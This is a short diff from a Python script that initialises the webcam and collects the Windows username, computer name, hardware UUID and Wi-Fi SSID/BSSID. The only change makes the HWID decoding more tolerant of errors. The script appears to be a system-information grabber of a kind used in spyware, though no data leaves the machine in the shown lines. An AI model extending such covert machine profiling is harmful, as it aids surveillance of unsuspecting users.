@@ -52,7 +52,7 @@ def format_drive_info(drives):
 pygame.camera.init()
 username = str(os.getenv("USERNAME"))
 hostname = str(os.environ['COMPUTERNAME'])
-hwid = str(subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8"))
+hwid = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8", errors="ignore")
 wifi_interfaces = pywifi.PyWiFi().interfaces()
 iface = wifi_interfaces[0] if wifi_interfaces else None
 ssid, bssid = "No result", "No result"
